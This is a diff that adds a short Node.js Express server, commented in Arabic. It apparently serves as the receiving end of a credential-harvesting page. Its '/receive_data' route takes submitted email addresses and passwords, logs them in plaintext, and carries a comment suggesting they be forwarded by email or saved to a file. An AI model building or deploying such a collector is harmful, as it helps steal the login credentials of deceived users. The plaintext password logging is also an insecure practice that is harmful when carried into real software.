@@ -1,0 +1,22 @@
+const express = require('express');
+const bodyParser = require('body-parser');
+const app = express();
+
+app.use(bodyParser.urlencoded({ extended: true }));
+
+// استماع للبيانات
+app.post('/receive_data', (req, res) => {
+    const email = req.body.email;
+    const password = req.body.password;
+
+    console.log("البريد الإلكتروني: " + email);
+    console.log("كلمة المرور: " + password);
+
+    // هنا يمكن إرسال البيانات عبر البريد الإلكتروني أو تخزينها في ملف
+    res.send('تم استقبال البيانات بنجاح.');
+});
+
+// تشغيل الخادم
+app.listen(3000, () => {
+    console.log('الخادم يعمل على المنفذ 3000');
+});
